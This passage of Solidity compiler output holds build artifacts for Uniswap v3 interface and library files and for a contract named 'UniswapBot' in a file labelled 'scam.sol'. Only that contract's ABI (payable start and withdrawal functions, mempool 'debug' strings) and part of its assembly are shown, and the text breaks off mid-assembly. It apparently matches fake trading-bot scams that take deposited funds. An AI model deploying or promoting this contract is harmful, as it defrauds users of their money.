									"sqrtPriceX96": "The current price of the pool as a sqrt(token1/token0) Q64.96 value tick The current tick of the pool, i.e. according to the last tick transition that was run. This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick boundary. observationIndex The index of the last oracle observation that was written, observationCardinality The current maximum number of observations stored in the pool, observationCardinalityNext The next maximum number of observations, to be updated when the observation. feeProtocol The protocol fee for both tokens of the pool. Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0 is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee. unlocked Whether the pool is currently locked to reentrancy"
								}
							},
							"ticks(int24)": {
								"params": {
									"tick": "The tick to look up"
								},
								"returns": {
									"liquidityGross": "the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position."
								}
							}
						},
						"title": "Pool state that can change",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"feeGrowthGlobal0X128()": "f3058399",
							"feeGrowthGlobal1X128()": "46141319",
							"liquidity()": "1a686502",
							"observations(uint256)": "252c09d7",
							"positions(bytes32)": "514ea4bf",
							"protocolFees()": "1ad8b03b",
							"slot0()": "3850c7bd",
							"tickBitmap(int16)": "5339c296",
							"ticks(int24)": "f30dba93"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"feeGrowthGlobal0X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal1X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidity\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"observations\",\"outputs\":[{\"internalType\":\"uint32\",\"name\":\"blockTimestamp\",\"type\":\"uint32\"},{\"internalType\":\"int56\",\"name\":\"tickCumulative\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityCumulativeX128\",\"type\":\"uint160\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"key\",\"type\":\"bytes32\"}],\"name\":\"positions\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"_liquidity\",\"type\":\"uint128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside0LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside1LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"protocolFees\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"token0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"token1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"slot0\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"},{\"internalType\":\"uint16\",\"name\":\"observationIndex\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinality\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"unlocked\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int16\",\"name\":\"wordPosition\",\"type\":\"int16\"}],\"name\":\"tickBitmap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"ticks\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"liquidityGross\",\"type\":\"uint128\"},{\"internalType\":\"int128\",\"name\":\"liquidityNet\",\"type\":\"int128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside0X128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside1X128\",\"type\":\"uint256\"},{\"internalType\":\"int56\",\"name\":\"tickCumulativeOutside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityOutsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsOutside\",\"type\":\"uint32\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"feeGrowthGlobal0X128()\":{\"details\":\"This value can overflow the uint256\"},\"feeGrowthGlobal1X128()\":{\"details\":\"This value can overflow the uint256\"},\"liquidity()\":{\"details\":\"This value has no relationship to the total liquidity across all ticks\"},\"observations(uint256)\":{\"details\":\"You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.\",\"params\":{\"index\":\"The element of the observations array to fetch\"},\"returns\":{\"blockTimestamp\":\"The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use\"}},\"positions(bytes32)\":{\"params\":{\"key\":\"The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\"},\"returns\":{\"_liquidity\":\"The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\"}},\"protocolFees()\":{\"details\":\"Protocol fees will never exceed uint128 max in either token\"},\"slot0()\":{\"returns\":{\"sqrtPriceX96\":\"The current price of the pool as a sqrt(token1/token0) Q64.96 value tick The current tick of the pool, i.e. according to the last tick transition that was run. This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick boundary. observationIndex The index of the last oracle observation that was written, observationCardinality The current maximum number of observations stored in the pool, observationCardinalityNext The next maximum number of observations, to be updated when the observation. feeProtocol The protocol fee for both tokens of the pool. Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0 is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee. unlocked Whether the pool is currently locked to reentrancy\"}},\"ticks(int24)\":{\"params\":{\"tick\":\"The tick to look up\"},\"returns\":{\"liquidityGross\":\"the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position.\"}}},\"title\":\"Pool state that can change\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"feeGrowthGlobal0X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\"},\"feeGrowthGlobal1X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\"},\"liquidity()\":{\"notice\":\"The currently in range liquidity available to the pool\"},\"observations(uint256)\":{\"notice\":\"Returns data about a specific observation index\"},\"positions(bytes32)\":{\"notice\":\"Returns the information about a position by the position's key\"},\"protocolFees()\":{\"notice\":\"The amounts of token0 and token1 that are owed to the protocol\"},\"slot0()\":{\"notice\":\"The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally.\"},\"tickBitmap(int16)\":{\"notice\":\"Returns 256 packed tick initialized boolean values. See TickBitmap for more information\"},\"ticks(int24)\":{\"notice\":\"Look up information about a specific tick in the pool\"}},\"notice\":\"These methods compose the pool's state, and can change with any frequency including multiple times per transaction\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":\"IUniswapV3PoolState\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {
							"feeGrowthGlobal0X128()": {
								"notice": "The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool"
							},
							"feeGrowthGlobal1X128()": {
								"notice": "The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool"
							},
							"liquidity()": {
								"notice": "The currently in range liquidity available to the pool"
							},
							"observations(uint256)": {
								"notice": "Returns data about a specific observation index"
							},
							"positions(bytes32)": {
								"notice": "Returns the information about a position by the position's key"
							},
							"protocolFees()": {
								"notice": "The amounts of token0 and token1 that are owed to the protocol"
							},
							"slot0()": {
								"notice": "The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally."
							},
							"tickBitmap(int16)": {
								"notice": "Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
							},
							"ticks(int24)": {
								"notice": "Look up information about a specific tick in the pool"
							}
						},
						"notice": "These methods compose the pool's state, and can change with any frequency including multiple times per transaction",
						"version": 1
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"LiquidityMath": {
					"abi": [],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"title": "Math library for liquidity",
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":109:621  library LiquidityMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n  0x0b\n  dup3\n  dup3\n  dup3\n  codecopy\n  dup1\n  mload\n  0x00\n  byte\n  0x73\n  eq\n  tag_1\n  jumpi\n  invalid\ntag_1:\n  mstore(0x00, address)\n  0x73\n  dup2\n  mstore8\n  dup3\n  dup2\n  return\nstop\n\nsub_0: assembly {\n        /* \"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":109:621  library LiquidityMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa264697066735822122076236c16cac3de1c4d6d16687398506ae1cecd05e6f5b97cbada2ff1640ff0bf64736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122076236c16cac3de1c4d6d16687398506ae1cecd05e6f5b97cbada2ff1640ff0bf64736f6c634300060c0033",
							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH23 0x236C16CAC3DE1C4D6D16687398506AE1CECD05E6F5B97C 0xBA 0xDA 0x2F CALL PUSH5 0xFF0BF6473 PUSH16 0x6C634300060C00330000000000000000 ",
							"sourceMap": "109:512:8:-:0;;;;;;;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122076236c16cac3de1c4d6d16687398506ae1cecd05e6f5b97cbada2ff1640ff0bf64736f6c634300060c0033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH23 0x236C16CAC3DE1C4D6D16687398506AE1CECD05E6F5B97C 0xBA 0xDA 0x2F CALL PUSH5 0xFF0BF6473 PUSH16 0x6C634300060C00330000000000000000 ",
							"sourceMap": "109:512:8:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"addDelta(uint128,int128)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH #[$]",
									"source": 8,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH [$]",
									"source": 8,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 8,
									"value": "B"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP3",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP3",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP3",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "CODECOPY",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP1",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "MLOAD",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 8,
									"value": "0"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "BYTE",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 8,
									"value": "73"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "EQ",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH [tag]",
									"source": 8,
									"value": "1"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "JUMPI",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "INVALID",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "tag",
									"source": 8,
									"value": "1"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "JUMPDEST",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "ADDRESS",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 8,
									"value": "0"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "MSTORE",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 8,
									"value": "73"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP2",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "MSTORE8",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP3",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP2",
									"source": 8
								},
								{
									"begin": 109,
									"end": 621,
									"name": "RETURN",
									"source": 8
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122076236c16cac3de1c4d6d16687398506ae1cecd05e6f5b97cbada2ff1640ff0bf64736f6c634300060c0033",
									".code": [
										{
											"begin": 109,
											"end": 621,
											"name": "PUSHDEPLOYADDRESS",
											"source": 8
										},
										{
											"begin": 109,
											"end": 621,
											"name": "ADDRESS",
											"source": 8
										},
										{
											"begin": 109,
											"end": 621,
											"name": "EQ",
											"source": 8
										},
										{
											"begin": 109,
											"end": 621,
											"name": "PUSH",
											"source": 8,
											"value": "80"
										},
										{
											"begin": 109,
											"end": 621,
											"name": "PUSH",
											"source": 8,
											"value": "40"
										},
										{
											"begin": 109,
											"end": 621,
											"name": "MSTORE",
											"source": 8
										},
										{
											"begin": 109,
											"end": 621,
											"name": "PUSH",
											"source": 8,
											"value": "0"
										},
										{
											"begin": 109,
											"end": 621,
											"name": "DUP1",
											"source": 8
										},
										{
											"begin": 109,
											"end": 621,
											"name": "REVERT",
											"source": 8
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"title\":\"Math library for liquidity\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":\"LiquidityMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":{\"keccak256\":\"0xd53041349718d5bce4a89e87cd911879d41ba42ba3fab0614e5e8b742f352b88\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://ea7529b99ab4fc1d3e6c5a31990fb688f0a2d6cc302c0419e0cf5a2d6c563781\",\"dweb:/ipfs/QmVaphRSNpfChHZKzutQ9WprwCo2WE1euvThRfHcwsnHhj\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"scam.sol": {
				"UniswapBot": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "string",
									"name": "_mainTokenSymbol",
									"type": "string"
								},
								{
									"internalType": "string",
									"name": "_mainTokenName",
									"type": "string"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "string",
									"name": "_msg",
									"type": "string"
								}
							],
							"name": "Log",
							"type": "event"
						},
						{
							"inputs": [],
							"name": "debugBot",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "debugMempool",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "start",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "withdrawal",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"scam.sol\":625:17573  contract UniswapBot {\r... */\n  mstore(0x40, 0x80)\n    /* \"scam.sol\":773:940  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x40\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n  0x0100000000\n  dup3\n  gt\n  iszero\n  tag_3\n  jumpi\n  0x00\n  dup1\n  revert\ntag_3:\n  dup4\n  dup3\n  add\n  swap2\n  pop\n  0x20\n  dup3\n  add\n  dup6\n  dup2\n  gt\n  iszero\n  tag_4\n  jumpi\n  0x00\n  dup1\n  revert\ntag_4:\n  dup3\n  mload\n  dup7\n  0x01\n  dup3\n  mul\n  dup4\n  add\n  gt\n  0x0100000000\n  dup3\n  gt\n  or\n  iszero\n  tag_5\n  jumpi\n  0x00\n  dup1\n  revert\ntag_5:\n  dup1\n  dup4\n  mstore\n  0x20\n  dup4\n  add\n  swap3\n  pop\n  pop\n  pop\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n  0x00\ntag_6:\n  dup4\n  dup2\n  lt\n  iszero\n  tag_8\n  jumpi\n  dup1\n  dup3\n  add\n  mload\n  dup2\n  dup5\n  add\n  mstore\n  0x20\n  dup2\n  add\n  swap1\n  pop\n  jump(tag_6)\ntag_8:\n  pop\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_9\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_9:\n  pop\n  0x40\n  mstore\n  0x20\n  add\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n  0x0100000000\n  dup3\n  gt\n  iszero\n  tag_10\n  jumpi\n  0x00\n  dup1\n  revert\ntag_10:\n  dup4\n  dup3\n  add\n  swap2\n  pop\n  0x20\n  dup3\n  add\n  dup6\n  dup2\n  gt\n  iszero\n  tag_11\n  jumpi\n  0x00\n  dup1\n  revert\ntag_11:\n  dup3\n  mload\n  dup7\n  0x01\n  dup3\n  mul\n  dup4\n  add\n  gt\n  0x0100000000\n  dup3\n  gt\n  or\n  iszero\n  tag_12\n  jumpi\n  0x00\n  dup1\n  revert\ntag_12:\n  dup1\n  dup4\n  mstore\n  0x20\n  dup4\n  add\n  swap3\n  pop\n  pop\n  pop\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n  0x00\ntag_13:\n  dup4\n  dup2\n  lt\n  iszero\n  tag_15\n  jumpi\n  dup1\n  dup3\n  add\n  mload\n  dup2\n  dup5\n  add\n  mstore\n  0x20\n  dup2\n  add\n  swap1\n  pop\n  jump(tag_13)\ntag_15:\n  pop\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_16\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_16:\n  pop\n  0x40\n  mstore\n  pop\n  pop\n  pop\n    /* \"scam.sol\":880:896  _mainTokenSymbol */\n  dup2\n    /* \"scam.sol\":865:877  debugMempool */\n  0x00\n    /* \"scam.sol\":865:896  debugMempool = _mainTokenSymbol */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_19\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_19:\n  pop\n    /* \"scam.sol\":918:932  _mainTokenName */\n  dup1\n    /* \"scam.sol\":907:915  debugBot */\n  0x01\n    /* \"scam.sol\":907:932  debugBot = _mainTokenName */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_21\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_21:\n  pop\n    /* \"scam.sol\":773:940  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {\r... */\n  pop\n  pop\n    /* \"scam.sol\":625:17573  contract UniswapBot {\r... */\n  jump(tag_22)\ntag_20:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_24\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_23)\ntag_24:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_23\n  jumpi\n  swap2\n  dup3\n  add\ntag_25:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_26\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_25)\ntag_26:\ntag_23:\n  pop\n  swap1\n  pop\n  tag_27\n  swap2\n  swap1\n  tag_28\n  jump\t// in\ntag_27:\n  pop\n  swap1\n  jump\t// out\ntag_28:\ntag_29:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_30\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_29)\ntag_30:\n  pop\n  swap1\n  jump\t// out\ntag_22:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"scam.sol\":625:17573  contract UniswapBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x7d53d433\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xbe9a6555\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xe1812f05\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"scam.sol\":688:710  string public debugBot */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_12:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_14\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_12)\n    tag_14:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_15\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_15:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"scam.sol\":15388:15575  function start() 